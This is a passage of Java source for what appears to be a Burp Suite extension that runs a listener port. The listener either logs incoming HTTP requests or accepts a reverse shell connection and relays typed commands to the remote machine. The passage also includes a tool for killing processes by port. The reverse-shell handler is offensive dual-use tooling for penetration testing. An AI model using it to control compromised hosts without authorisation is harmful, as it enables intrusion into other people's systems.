                JOptionPane.showMessageDialog(this, "Please enter a valid port (1-65535).", "Invalid Port", JOptionPane.ERROR_MESSAGE);
                return;
            }

            // Store the current port
            currentPort = port;

            // Get all available IP addresses
            List<String> ipAddresses = getAvailableIpAddresses();
            String ipDisplay;
            if (ipAddresses.isEmpty()) {
                ipDisplay = "127.0.0.1 (localhost only)";
                callbacks.printError("No non-loopback IP addresses found.");
            } else {
                ipDisplay = String.join(", ", ipAddresses);
            }

            String mode = (String) modeCombo.getSelectedItem();

            // Update UI based on mode
            CardLayout cl = (CardLayout) (modePanel.getLayout());
            if ("Reverse Shell".equals(mode)) {
                cl.show(modePanel, SHELL_CARD);
                shellDisplayPane.setText("Waiting for reverse shell connection on port " + port + "...\n");
                bottomPanel.setVisible(true);
            } else {
                cl.show(modePanel, WEBHOOK_CARD);
                bottomPanel.setVisible(false);
            }

            // Update UI
            startButton.setEnabled(false);
            stopButton.setEnabled(true);
            portField.setEnabled(false);
            modeCombo.setEnabled(false);
            statusField.setText("Listening on " + ipDisplay + ":" + port + (ipAddresses.isEmpty() ? "" : ". If using a VPN, ensure the port is not blocked."));
            statusField.setForeground(new Color(46, 204, 113));

            isListening = true;
            listenerThread = new Thread(() -> runListener(port, mode));
            listenerThread.start();

        } catch (NumberFormatException e) {
            JOptionPane.showMessageDialog(this, "Please enter a valid port number.", "Invalid Port", JOptionPane.ERROR_MESSAGE);
        }
    }

    private List<String> getAvailableIpAddresses() {
        List<String> ipAddresses = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                // Skip loopback, virtual, and non-active interfaces
                if (iface.isLoopback() || !iface.isUp() || iface.isVirtual()) {
                    continue;
                }
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    // Only include IPv4 addresses for simplicity
                    if (addr instanceof java.net.Inet4Address) {
                        ipAddresses.add(addr.getHostAddress());
                    }
                }
            }
        } catch (SocketException e) {
            callbacks.printError("Error retrieving network interfaces: " + e.getMessage());
        }
        return ipAddresses;
    }

    public void cleanup() {
        isListening = false;
        stopListener();
        if (shellOut != null) {
            shellOut.close();
            shellOut = null;
        }
        if (clientSocket != null && !clientSocket.isClosed()) {
            try {
                clientSocket.close();
            } catch (IOException e) {
                // Ignore
            }
            clientSocket = null;
        }
        if (shellReaderThread != null && shellReaderThread.isAlive()) {
            shellReaderThread.interrupt();
            shellReaderThread = null;
        }
    }

    private void stopListener() {
        isListening = false;
        if (serverSocket != null && !serverSocket.isClosed()) {
            try {
                serverSocket.close();
            } catch (IOException e) {
                callbacks.printError("Error closing server socket: " + e.getMessage());
            }
        }
        if (clientSocket != null && !clientSocket.isClosed()) {
            try {
                clientSocket.close();
            } catch (IOException e) {
                callbacks.printError("Error closing client socket: " + e.getMessage());
            }
        }
        if (listenerThread != null) {
            listenerThread.interrupt();
        }

        // Reset UI
        startButton.setEnabled(true);
        stopButton.setEnabled(false);
        portField.setEnabled(true);
        modeCombo.setEnabled(true);
        currentPort = -1; // Reset current port
        statusField.setText("Listener not running. Note: If using a VPN, ensure the port is accessible.");
        statusField.setForeground(Color.GRAY);
        bottomPanel.setVisible(false);
        inputField.setEnabled(false);
        sendButton.setEnabled(false);
        if (promptLabel != null) {
            promptLabel.setText(" Command:");
        }
    }

    private void killUsedPorts() {
        killPortsButton.setEnabled(false);
        new Thread(() -> {
            try {
                List<PortInfo> usedPorts = getUsedPorts();
                SwingUtilities.invokeLater(() -> {
                    killPortsButton.setEnabled(true);
                    if (usedPorts.isEmpty()) {
                        JOptionPane.showMessageDialog(this, "No TCP ports are currently in use.", "No Ports Found", JOptionPane.INFORMATION_MESSAGE);
                        return;
                    }
                    showKillPortsDialog(usedPorts);
                });
            } catch (Exception e) {
                SwingUtilities.invokeLater(() -> {
                    killPortsButton.setEnabled(true);
                    JOptionPane.showMessageDialog(this, "Error scanning ports: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
                });
            }
        }).start();
    }

    private void showKillPortsDialog(List<PortInfo> usedPorts) {
        // Create popup dialog
        JDialog portDialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Select Ports to Kill", Dialog.ModalityType.APPLICATION_MODAL);
        portDialog.setLayout(new BorderLayout(10, 10));
        portDialog.setSize(600, 400);

        // Table to display ports
        String[] columns = {"Select", "Port", "Protocol", "Local Address", "PID", "Process Name"};
        DefaultTableModel portTableModel = new DefaultTableModel(columns, 0) {
            @Override
            public Class<?> getColumnClass(int columnIndex) {
                return columnIndex == 0 ? Boolean.class : String.class;
            }
            @Override
            public boolean isCellEditable(int row, int column) {
                return column == 0; // Only the checkbox column is editable
            }
        };
        JTable portTable = new JTable(portTableModel);
        portTable.setRowHeight(20);
        portTable.getColumnModel().getColumn(0).setPreferredWidth(50); // Select
        portTable.getColumnModel().getColumn(1).setPreferredWidth(80); // Port
        portTable.getColumnModel().getColumn(2).setPreferredWidth(80); // Protocol
        portTable.getColumnModel().getColumn(3).setPreferredWidth(150); // Local Address
        portTable.getColumnModel().getColumn(4).setPreferredWidth(80); // PID
        portTable.getColumnModel().getColumn(5).setPreferredWidth(150); // Process Name

        // Populate table
        for (PortInfo portInfo : usedPorts) {
            boolean isCurrentPort = portInfo.port == currentPort;
            portTableModel.addRow(new Object[]{
                    isCurrentPort, // Pre-check if it's the current listener port
                    String.valueOf(portInfo.port),
                    portInfo.protocol,
                    portInfo.localAddress,
                    portInfo.pid != -1 ? String.valueOf(portInfo.pid) : "N/A",
                    portInfo.processName != null ? portInfo.processName : "Unknown"
            });
        }

        JScrollPane portScrollPane = new JScrollPane(portTable);
        portDialog.add(portScrollPane, BorderLayout.CENTER);

        // Warning and buttons
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT));
        JLabel warningLabel = new JLabel("<html><b>Warning:</b> Terminating processes may disrupt running applications. Proceed with caution.</html>");
        warningLabel.setForeground(Color.RED);
        buttonPanel.add(warningLabel);

        JButton killButton = new JButton("Kill Selected Ports");
        JButton cancelButton = new JButton("Cancel");
        killButton.addActionListener(e -> {
            boolean currentPortSelected = false;
            List<Integer> pidsToKill = new ArrayList<>();
            List<Integer> portsToKill = new ArrayList<>();
            for (int i = 0; i < portTableModel.getRowCount(); i++) {
                if ((Boolean) portTableModel.getValueAt(i, 0)) {
                    int port = Integer.parseInt((String) portTableModel.getValueAt(i, 1));
                    String pidStr = (String) portTableModel.getValueAt(i, 4);
                    int pid = pidStr.equals("N/A") ? -1 : Integer.parseInt(pidStr);
                    if (port == currentPort) {
                        currentPortSelected = true;
                    } else if (pid != -1) {
                        pidsToKill.add(pid);
                        portsToKill.add(port);
                    }
                }
            }

            if (pidsToKill.isEmpty() && !currentPortSelected) {
                JOptionPane.showMessageDialog(portDialog, "No ports selected to kill.", "No Selection", JOptionPane.WARNING_MESSAGE);
                return;
            }

            // Confirm action
            int confirm = JOptionPane.showConfirmDialog(portDialog,
                    "Are you sure you want to terminate the selected processes? This may disrupt running applications.",
                    "Confirm Kill", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE);
            if (confirm != JOptionPane.YES_OPTION) {
                return;
            }

            final boolean finalCurrentPortSelected = currentPortSelected;
            killButton.setEnabled(false);
            new Thread(() -> {
                StringBuilder resultMessage = new StringBuilder();
                if (finalCurrentPortSelected) {
                    SwingUtilities.invokeLater(this::stopListener);
                    resultMessage.append("Current listener on port ").append(currentPort).append(" stopped.\n");
                }

                // Kill other selected processes
                for (int i = 0; i < pidsToKill.size(); i++) {
                    int pid = pidsToKill.get(i);
                    int port = portsToKill.get(i);
                    boolean success = killProcess(pid);
                    resultMessage.append("Port ").append(port).append(" (PID ").append(pid).append("): ")
                            .append(success ? "Terminated successfully" : "Failed to terminate").append("\n");
                }

                SwingUtilities.invokeLater(() -> {
                    JOptionPane.showMessageDialog(this, resultMessage.toString(), "Kill Ports Result", JOptionPane.INFORMATION_MESSAGE);
                    portDialog.dispose();
                });
            }).start();
        });
        cancelButton.addActionListener(e -> portDialog.dispose());

        buttonPanel.add(killButton);
        buttonPanel.add(cancelButton);
        portDialog.add(buttonPanel, BorderLayout.SOUTH);

        // Center the dialog
        portDialog.setLocationRelativeTo(this);
        portDialog.setVisible(true);
    }

    private List<PortInfo> getUsedPorts() {
        List<PortInfo> usedPorts = new ArrayList<>();
        String os = System.getProperty("os.name").toLowerCase();
        String command = os.contains("win") ? "netstat -aon | findstr LISTENING" : "netstat -tulnp";

        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            Pattern pattern = os.contains("win") ?
                    Pattern.compile("\\s*TCP\\s+(\\S+):(\\d+)\\s+\\S+\\s+LISTENING\\s+(\\d+)") :
                    Pattern.compile("tcp\\s+\\d+\\s+\\d+\\s+(\\S+):(\\d+)\\s+.*LISTEN\\s+(\\d+)/(\\S+)");

            while ((line = reader.readLine()) != null) {
                Matcher matcher = pattern.matcher(line);
                if (matcher.find()) {
                    String localAddress = matcher.group(1);
                    int port = Integer.parseInt(matcher.group(2));
                    int pid = matcher.group(3) != null ? Integer.parseInt(matcher.group(3)) : -1;
                    String processName = os.contains("win") ? getWindowsProcessName(pid) : (matcher.groupCount() >= 4 ? matcher.group(4) : "Unknown");
                    usedPorts.add(new PortInfo(port, "TCP", localAddress, pid, processName));
                }
            }
            reader.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            callbacks.printError("Error retrieving used ports: " + e.getMessage());
            SwingUtilities.invokeLater(() -> {
                JOptionPane.showMessageDialog(this, "Failed to retrieve used ports: " + e.getMessage() +
                                ". Ensure you have sufficient permissions (e.g., run as administrator on Windows or with sudo on Unix-like systems).",
                        "Error", JOptionPane.ERROR_MESSAGE);
            });
        }
        return usedPorts;
    }

    private String getWindowsProcessName(int pid) {
        if (pid == -1) return "Unknown";
        String command = "tasklist /svc /fi \"PID eq " + pid + "\" /fo list";
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("Image Name:")) {
                    return line.substring("Image Name:".length()).trim();
                }
            }
            reader.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            callbacks.printError("Error retrieving process name for PID " + pid + ": " + e.getMessage());
        }
        return "Unknown";
    }

    private boolean killProcess(int pid) {
        if (pid == -1) return false;
        String os = System.getProperty("os.name").toLowerCase();
        String command = os.contains("win") ? "taskkill /PID " + pid + " /F" : "kill -9 " + pid;
        try {
            Process process = Runtime.getRuntime().exec(command);
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (IOException | InterruptedException e) {
            callbacks.printError("Error killing process " + pid + ": " + e.getMessage());
            return false;
        }
    }

    private void clearHistory() {
        SwingUtilities.invokeLater(() -> {
            // Clear the history list and table
            requestHistory.clear();
            tableModel.setRowCount(0);
            // Reset text area
            shellDisplayPane.setText("Send a request or start the listener to display HTTP requests...");
            // Disable clear button
        });
    }

    private void runListener(int port, String mode) {
        try {
            // Bind to 0.0.0.0 to listen on all interfaces
            serverSocket = new ServerSocket(port, 50, InetAddress.getByName("0.0.0.0"));
            callbacks.printOutput("Listener started on port " + port + " in mode: " + mode);

            while (isListening) {
                // Reverse shell must handle its own socket lifecycle because it's long-lived.
                if ("Reverse Shell".equals(mode)) {
                    try {
                        Socket client = serverSocket.accept();
                        clientSocket = client; // Assign to class field for management
                        handleReverseShell(client);
                        // In this simple design, we handle one shell and then the listener stops for that mode
                        break;
                    } catch (IOException e) {
                        if (isListening) callbacks.printError("Error accepting reverse shell: " + e.getMessage());
                    }
                } else {
                    // HTTP mode uses try-with-resources for automatic socket closing.
                    try (Socket client = serverSocket.accept()) {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                        StringBuilder requestBuilder = new StringBuilder();
                        String line;
                        String method = "";
                        String url = "";
                        while ((line = reader.readLine()) != null && !line.isEmpty()) {
                            requestBuilder.append(line).append("\n");
                            if (line.contains(" HTTP/")) {
                                String[] parts = line.split(" ");
                                if (parts.length >= 2) {
                                    method = parts[0];
                                    url = parts[1];
                                }
                            }
                        }
                        // Read request body if present
                        while (reader.ready()) {
                            requestBuilder.append((char) reader.read());
                        }

                        // 1. Define the response body text
                        String responseBody = "Reverse Shell Receiver | Ready for Interaction";
                        byte[] responseBodyBytes = responseBody.getBytes(StandardCharsets.UTF_8);

                        // 2. Construct the full HTTP response with correct headers
                        String responseString = "HTTP/1.1 200 OK\r\n" +
                                                "Content-Type: text/html; charset=utf-8\r\n" +
                                                "Content-Length: " + responseBodyBytes.length + "\r\n" +
                                                "Connection: close\r\n" +
                                                "\r\n" + // Empty line separates headers from body
                                                responseBody;

                        // 3. Combine the request and full response for display
                        String requestPart = requestBuilder.toString();
                        String fullTransaction = requestPart +
                                                "\n\n" +
                                                "---------------- RESPONSE ----------------\n\n" +
                                                responseString;

                        // 4. Send the response to the client (the browser)
                        client.getOutputStream().write(responseString.getBytes(StandardCharsets.UTF_8));

                        // Filter out favicon.ico requests from being logged
                        if (!url.equals("/favicon.ico")) {
                            // 5. Add the full transaction to the UI history
                            addRequestToHistory(method, url, fullTransaction.getBytes(StandardCharsets.UTF_8));
                        }

                        // The client socket is automatically closed by the try-with-resources block.
                    } catch (IOException e) {
                        if (isListening) {
                            callbacks.printError("Error handling client: " + e.getMessage());
                        }
                    }
                }
            }
        } catch (IOException e) {
            if (isListening) {
                callbacks.printError("Error starting listener: " + e.getMessage());
                SwingUtilities.invokeLater(() -> {
                    JOptionPane.showMessageDialog(this, "Failed to start listener: " + e.getMessage() +
                                    ". If using a VPN, ensure the port is not blocked by VPN settings.",
                            "Listener Error", JOptionPane.ERROR_MESSAGE);
                    stopListener();
                });
            }
        } finally {
            if (serverSocket != null && !serverSocket.isClosed()) {
                try {
                    serverSocket.close();
                } catch (IOException e) {
                    callbacks.printError("Error closing server socket: " + e.getMessage());
                }
            }
        }
    }

    /**
     * Appends styled text to the shell display pane and ensures it scrolls to the bottom.
     * This method is thread-safe for Swing.
     * @param msg The message to append.
     * @param style The style to apply to the message.
     */
    private void appendToPane(String msg, Style style) {
        SwingUtilities.invokeLater(() -> {
            try {
                StyledDocument doc = shellDisplayPane.getStyledDocument();
                doc.insertString(doc.getLength(), msg, style);
                // Auto-scroll to the bottom
                shellDisplayPane.setCaretPosition(doc.getLength());
            } catch (Exception e) {
                callbacks.printError("Failed to append text to pane: " + e.getMessage());
            }
        });
    }

    private void handleReverseShell(Socket client) {
        this.currentClient = client; // Store for management
        this.clientSocket = client; // Compatibility
        try {
            // Simple UI setup
            SwingUtilities.invokeLater(() -> {
                shellDisplayPane.setText("");
                String connectMsg = "Connected to " + client.getRemoteSocketAddress() + "\n";
                appendToPane(connectMsg, styleStatus);

                if (promptLabel != null) {
                    promptLabel.setText("Connected");
                }

                inputField.setEnabled(true);
                sendButton.setEnabled(true);
                sendButton.setText("Send");
                inputField.requestFocusInWindow();

                // Set monospace font
                try {
                    Font terminalFont = new Font("Consolas", Font.PLAIN, 12);
                    if (!terminalFont.getFamily().equals("Consolas")) {
                        terminalFont = new Font(Font.MONOSPACED, Font.PLAIN, 12);
                    }
                    shellDisplayPane.setFont(terminalFont);
                    inputField.setFont(terminalFont);
                } catch (Exception e) {
                    // Use default if font setup fails
                }
            });

            // Stream setup
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            shellOut = new PrintWriter(client.getOutputStream(), true);

            // Store the last sent command to filter echoes
            final String[] lastCommand = {""};

            // Reader thread for incoming data
            shellReaderThread = new Thread(() -> {
                try {
                    String line;

                    while ((line = in.readLine()) != null) {
                        // Clean the line
                        String cleanLine = line
                            .replaceAll("\u001B\\[[0-9;]*[mGKHJABCD]", "")
                            .replaceAll("\u001B\\[\\?[0-9]+[hl]", "")
                            .replaceAll("\r", "")
                            .trim();

                        // Skip completely empty lines
                        if (cleanLine.isEmpty()) {
                            continue;
                        }

                        // Skip setup commands
                        if (cleanLine.contains("stty") ||
                            cleanLine.contains("export") ||
                            cleanLine.equals("#") ||
                            cleanLine.equals("$")) {
                            continue;
                        }

                        // CRITICAL: Skip any line that contains the last command we sent
                        if (!lastCommand[0].isEmpty() && cleanLine.contains(lastCommand[0])) {
                            continue;
                        }

                        // Skip lines that are just prompts with commands (# somecommand)
                        if (cleanLine.matches("^[#$]+\\s+.*")) {
                            continue;
                        }

                        // This should be actual output - display it
                        final String output = cleanLine;
                        SwingUtilities.invokeLater(() -> {
                            appendToPane(output + "\n", styleNormal);
                        });
                    }
                } catch (IOException e) {
                    // Connection closed
                } finally {
                    SwingUtilities.invokeLater(() -> {
                        appendToPane("\n[Want to Reconnect - Stop listener and Start Again...]\n", styleStatus);
                        if (promptLabel != null) {
                            promptLabel.setText("Disconnected");
                        }
                        sendButton.setText("Disconnected");
                        // Keep everything enabled for reconnection and local commands
                    });
                }
            });
            shellReaderThread.setDaemon(true);
            shellReaderThread.start();

            // Only add command listeners if they don't already exist
            if (sendButton.getActionListeners().length == 0) {
                setupCommandListeners();
            }

        } catch (IOException e) {
            callbacks.printError("Reverse shell connection error: " + e.getMessage());
            SwingUtilities.invokeLater(() -> {
                String errorMsg = "Connection failed: " + e.getMessage() + "\n";
                appendToPane(errorMsg, styleStatus);
                if (promptLabel != null) {
                    promptLabel.setText("Failed");
                }
            });
        }
    }

    private void setupCommandListeners() {
        // Command handling that persists across connections
        ActionListener commandListener = e -> {
            String cmd = inputField.getText().trim();
            if (cmd.isEmpty()) {
                return;
            }

            // Handle local commands (always available)
            if (cmd.equals("clear") || cmd.equals("cls")) {
                SwingUtilities.invokeLater(() -> {
                    shellDisplayPane.setText("");
                    appendToPane("Terminal cleared.\n", styleStatus);
                });
                inputField.setText("");
                return;
            }

            if (cmd.equals("status")) {
                SwingUtilities.invokeLater(() -> {
                    String status = (shellOut != null && !shellOut.checkError() && currentClient != null && !currentClient.isClosed()) ?
                        "[Connected - Ready to send commands]\n" :
                        "[Disconnected - Waiting for payload to reconnect...]\n";
                    appendToPane(status, styleStatus);
                });
                inputField.setText("");
                return;
            }

            // Check if we're connected before sending remote commands
            if (shellOut == null || shellOut.checkError()) {
                SwingUtilities.invokeLater(() -> {
                    appendToPane("[Not connected] Use 'status' to check connection or 'clear' to clear terminal.\n", styleStatus);
                    appendToPane("Waiting for payload to reconnect...\n", styleStatus);
                });
                inputField.setText("");
                return;
            }

            // Handle exit/quit
            if (cmd.equals("exit") || cmd.equals("quit")) {
                SwingUtilities.invokeLater(() -> {
                    appendToPane("Sending exit command...\n", styleStatus);
                });
                shellOut.println("exit");
                shellOut.flush();
                inputField.setText("");
                return;
            }

            // Show the command we're sending
            SwingUtilities.invokeLater(() -> {
                appendToPane("\n┌──(㉿ Reverse Shell Receiver)-[~]\r\n" + //
                                        "└─# " + cmd + "\n", styleInput);
            });

            // Send command to remote shell
            shellOut.print(cmd + "\n");
            shellOut.flush();
            inputField.setText("");
        };

        // Add listeners (they will persist across connections)
        inputField.addActionListener(commandListener);
        sendButton.addActionListener(commandListener);
    }

    // Helper method to update UI when reconnected
    private void updateConnectionStatus(Socket client) {
        SwingUtilities.invokeLater(() -> {
            String reconnectMsg = "\n[Reconnected to " + client.getRemoteSocketAddress() + "]\n";
            appendToPane(reconnectMsg, styleStatus);

            if (promptLabel != null) {
                promptLabel.setText("Connected");
            }

            sendButton.setText("Send");
            inputField.requestFocusInWindow();
        });
    }

    public void addEntry(IHttpRequestResponse requestResponse, int toolFlag) {
        byte[] requestBytes = requestResponse.getRequest();

        // Parse method and URL
        IRequestInfo info = helpers.analyzeRequest(requestResponse);
        String method = info.getMethod();
        String url = info.getUrl().toString();

        // Add to history
        addRequestToHistory(method, url, requestBytes);
    }

    public void saveSettings(boolean showMessage) {
        // Implementation for settings persistence using callbacks.loadExtensionSetting/saveExtensionSetting
        callbacks.saveExtensionSetting("port", portField.getText());
        callbacks.saveExtensionSetting("mode", (String) modeCombo.getSelectedItem());
        if (showMessage) {
            callbacks.printOutput("Settings saved.");
        }
    }

    public void loadSettings() {
        String port = callbacks.loadExtensionSetting("port");
        String mode = callbacks.loadExtensionSetting("mode");
        if (port != null) portField.setText(port);
        if (mode != null) modeCombo.setSelectedItem(mode);
    }

    public void sendToReverseShellReceiverAction(IContextMenuInvocation invocation) {
        // Get the selected HTTP messages
        final IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();

        // Check if any message is selected
        if (selectedMessages != null && selectedMessages.length > 0) {
            // Get the request bytes from the first selected message
            byte[] requestBytes = selectedMessages[0].getRequest();

            // Analyze request to get method and URL
            IRequestInfo info = helpers.analyzeRequest(selectedMessages[0]);
            String method = info.getMethod();
            String url = info.getUrl().toString();

            // Add to history
            addRequestToHistory(method, url, requestBytes);
        }
    }

    private void addRequestToHistory(String method, String url, byte[] requestBytes) {
        SwingUtilities.invokeLater(() -> {
            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            RequestEntry entry = new RequestEntry(requestHistory.size() + 1, method, url, timestamp, requestBytes);
            requestHistory.add(entry);
            tableModel.addRow(new Object[]{entry.index, entry.method, entry.url, entry.timestamp});

            // Auto-select the latest request
            int lastRow = tableModel.getRowCount() - 1;
            int viewRow = historyTable.convertRowIndexToView(lastRow);
            if (viewRow >= 0) {
                historyTable.setRowSelectionInterval(viewRow, viewRow);
                requestViewer.setMessage(requestBytes, true);
            }

            // Enable clear history button
            clearHistoryButton.setEnabled(true);
        });
    }

    private final IMessageEditorController requestController = new IMessageEditorController() {
        @Override
        public IHttpService getHttpService() {
            return null;
        }

        @Override
        public byte[] getRequest() {
            int selectedRow = historyTable.getSelectedRow();
            if (selectedRow != -1) {
                int modelRow = historyTable.convertRowIndexToModel(selectedRow);
                return requestHistory.get(modelRow).fullRequest;
            }
            return null;
        }

        @Override
        public byte[] getResponse() {
            return null;
        }
    };

    private static class RequestEntry {
        int index;
        String method;
        String url;
        String timestamp;
        byte[] fullRequest;

        RequestEntry(int index, String method, String url, String timestamp, byte[] fullRequest) {
            this.index = index;
            this.method = method;
            this.url = url;
            this.timestamp = timestamp;
            this.fullRequest = fullRequest;
        }
    }

    private static class PortInfo {
        int port;
        String protocol;
        String localAddress;
        int pid;
        String processName;

        PortInfo(int port, String protocol, String localAddress, int pid, String processName) {
            this.port = port;
            this.protocol = protocol;
            this.localAddress = localAddress;
            this.pid = pid;
            this.processName = processName;
        }
    }
}